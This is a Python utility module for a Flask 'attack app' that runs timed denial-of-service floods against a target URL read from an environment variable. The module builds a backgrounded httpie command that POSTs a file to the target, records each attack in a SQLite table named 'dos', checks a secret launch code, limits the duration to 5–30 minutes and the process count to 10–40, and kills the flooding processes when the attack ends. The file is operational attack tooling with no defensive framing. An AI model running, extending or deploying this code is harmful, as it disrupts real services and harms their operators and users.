"""Attack app utils."""

# Python
import os
import subprocess

# Sqlite3
import sqlite3
from sqlite3 import Error

# Flask
from flask import jsonify

# Utils
import pytz


HTTP_CMD = 'http POST {} x@/app/xxx -f --follow -p H --timeout 3600 -I >> /dev/null &'.format(os.getenv('URL_TO_ATTACK'))

ARG_TZ = pytz.timezone('America/Argentina/Buenos_Aires')


def terminate_attack():  
    processes = int(subprocess.getoutput('ps -C http | grep http | wc -l'))
    if processes:
        os.system('killall -9 http')
    os.system('sqlite3 /app/db.sqlite3 < /app/reset-db.sql')


def open_db():
    """Create a database connection to 
    the SQLite database "db.sqlite3".
    """
    db = None
    try:
        db = sqlite3.connect('/app/db.sqlite3')
        return db
    except Error as e:
        print(e)

    return db


def get_last_obj():
    """Return end_time, start_time and n from db."""
    db = open_db()
    query = db.execute("""
        SELECT end_time, start_time, n
        FROM dos 
        WHERE id = (SELECT MAX(id) FROM dos)
    """).fetchone()
    if query:
        end_time = int(query[0])
        start_time = int(query[1])
        n = int(query[2])
        db.close()
        return end_time, start_time, n
    db.close()


def validate_request(request):
    """Check if the request data is valid."""
    data = request.json
    args_needed = ['launch_code', 'minutes']
    values = {}

    if not data:
        return (jsonify({'message': 'Invalid request.'}), 400)

    if any([x not in data for x in args_needed]):
        return (jsonify({'message': 'Invalid request.'}), 400)

    if data['launch_code'] != os.getenv('LAUNCH_CODE'):
        return (jsonify({'message': 'Invalid launch code.'}), 403)

    try:
        minutes = int(data['minutes'])
    except ValueError:
        return (jsonify({'message': '\'minutes\' must be a number.'}), 406)
    if minutes < 5 or minutes > 30:
        return (jsonify({'message': '\'minutes\' must be between 5 and 30.'}), 406)
    values['minutes'] = minutes

    if 'n' in data:
        try:
            n = int(data['n'])
        except ValueError:
            return (jsonify({'message': '\'n\' must be a number.'}), 406)
        if n < 10 or n > 40:
            return (jsonify({'message': '\'n\' must be between 10 and 40.'}), 406)
        values['n'] = n
    else:
        values['n'] = 10

    return values
